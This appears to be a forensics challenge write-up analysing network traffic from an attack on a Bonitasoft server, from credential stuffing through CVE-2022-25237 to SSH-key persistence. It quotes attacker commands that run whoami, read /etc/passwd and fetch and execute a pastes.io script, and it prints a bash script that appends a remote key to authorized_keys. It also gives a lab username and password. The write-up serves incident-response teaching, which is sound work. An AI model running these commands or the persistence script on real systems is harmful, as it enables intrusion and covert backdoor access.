# We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?

filter ```http``` Wireshark; notice URL has 'bonita'

open JSON alerts file and search ```bonita``` to find entries for 'Bonitasoft' (confirm with search if desired)

## Answer
```bonitasoft```

# We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?

filter to ```http.request.method=="POST"``` and notice all the logins

expand the form information to see different usernames and passwords

looks like credential stuffing 

## Answer 
Credential Stuffing

# Does the vulnerability exploited have a CVE assigned - and if so, which one?
If you searched the JSON alerts file for Bonitasoft you likely already saw a CVE number such as this line (and others)
```ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)"```

We can also search "Bonitasoft credential stuffing" (or similar) and/or the above CVE number and check results e.g. NVD

## Answer
CVE-2022-25237

# Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?
The NVD description (https://nvd.nist.gov/vuln/detail/CVE-2022-25237) will have this information and we can verify
in the PCAP file

```http.request.method=="POST" && http.request.uri contains "i18ntranslation"```

## Answer
i18ntranslation

# How many combinations of usernames and passwords were used in the credential stuffing attack?
Let's look at all the form submissions

```http.content_type == "application/x-www-form-urlencoded"```

Taking a look at a few we see that each one is followed up with another showing "install:install" so let's remove those

```http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.value != "install"```\

This leaves us with 59 packets but if we look at the last three we see the same credentials (seb.broom@forela.co.uk:g0vernm3nt
) indicating a change, we can check the response to see that this credential was successful (204 response rather than 401 for the others).

Ultimately, there are 4 packets in our filtered list associated with the successful reqest meaning that we have 56 unique username:password attempts

## Answer
56

# Which username and password combination was successful?
As we discovered above "seb.broom@forela.co.uk:g0vernm3nt" was the successful username:password pair


## Answer
seb.broom@forela.co.uk:g0vernm3nt

# If any, which text sharing site did the attacker utilise?
After successful authentication the attacket makes a POST to upload "rce_api_extension.zip" then follows with a few GET requests including a "cmd=whoami", "cmd=cat%20/etc/passwd" and a ```"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"``` then subsequently executes this file with "cmd=bash%20bx5gcr0et8"

## Answer
pastes.io

# Please provide the filename of the public key used by the attacker to gain persistence on our host.
If we follow the link to which the wget command pointed we arrive at a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and restart the SSH service:
    #!/bin/bash
    curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
    sudo service ssh restart

## Answer
hffgra4unv

# Can you confirmed the file modified by the attacker to gain persistence?
As we see above the modified file is the authorized_keys file which is appended with a new key

## Answer
/home/ubuntu/.ssh/authorized_keys

# Can you confirm the MITRE technique ID of this type of persistence mechanism?
Going to the ATT&CK Navigator and creating a new layer with the Enterprise matrix (https://mitre-attack.github.io/attack-navigator/) a simple search on SSH quickly reveals a result "Account Manipulation : SSH Authorized Keys". Click view to be taking to the description (https://attack.mitre.org/techniques/T1098/004/) which, of course, includes the ID 

## Answer
T1098.004